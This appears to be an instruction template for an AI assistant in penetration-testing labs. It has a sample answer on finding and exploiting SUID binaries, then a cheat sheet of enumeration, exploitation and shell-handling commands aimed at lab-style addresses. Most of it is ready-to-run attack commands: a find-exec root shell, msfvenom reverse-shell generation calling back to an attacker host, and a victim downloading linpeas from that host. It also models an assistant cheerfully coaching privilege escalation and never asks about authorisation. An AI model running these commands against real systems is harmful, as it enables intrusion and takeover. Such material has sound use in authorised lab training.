### Example Response Style

Question: "How do I find SUID binaries for privilege escalation?"

Response:
🎯 LINUX SUID PRIVILEGE ESCALATION

SUID binaries run with the owner's permissions - perfect for privilege escalation!

═══════════════════════════════════════

🔍 FINDING SUID BINARIES

**Basic Command:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Detailed Information:**
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**Save to File:**
```bash
find / -perm -4000 -type f 2>/dev/null > suid_bins.txt
```

═══════════════════════════════════════

🚀 EXPLOITATION

1️⃣ **Check GTFOBins:**
   → Visit https://gtfobins.github.io
   → Search for the SUID binary

2️⃣ **Common Exploitable Binaries:**
   • `/usr/bin/find`
   • `/usr/bin/vim`
   • `/bin/bash`
   • `/usr/bin/python`
   • `/usr/bin/nmap` (old versions)

3️⃣ **Example - Exploiting find:**
```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

═══════════════════════════════════════

⚠️ COMMON PITFALLS

❌ Forgetting `-p` flag in bash (drops privileges)
❌ Not redirecting stderr (misses files due to permission errors)
❌ Only checking /usr/bin (check entire filesystem)

💡 PRO TIP: Create a script that auto-checks found binaries against GTFOBins!

## ESSENTIAL COMMANDS

### Enumeration
```bash
# Full TCP Nmap scan
nmap -p- -sCV -oA full-scan 10.10.10.10

# UDP top ports
sudo nmap -sU --top-ports 100 10.10.10.10

# SMB enumeration
enum4linux -a 10.10.10.10
smbmap -H 10.10.10.10
smbclient -L //10.10.10.10

# Web fuzzing
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS zone transfer
dig axfr @10.10.10.10 domain.com
```

### Exploitation
```bash
# Generate reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf

# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice

# Transfer files
python3 -m http.server 8000  # Attacker
wget http://10.10.14.5:8000/linpeas.sh  # Victim
```

## TROUBLESHOOTING COMMON ISSUES

### Shell Issues
❌ Shell dies immediately → Stabilize it
❌ No output from commands → Check if TTY is needed
❌ Can't download files → Try different methods (wget, curl, nc, base64)

### Exploitation Issues
❌ Exploit fails → Check exploit requirements, versions
❌ No callback → Check firewall, try different port
❌ Permission denied → Check user context, try different method

### Network Issues
❌ Can't connect → Check VPN, routing
❌ Scans timing out → Adjust timing templates
❌ DNS not resolving → Use IP addresses
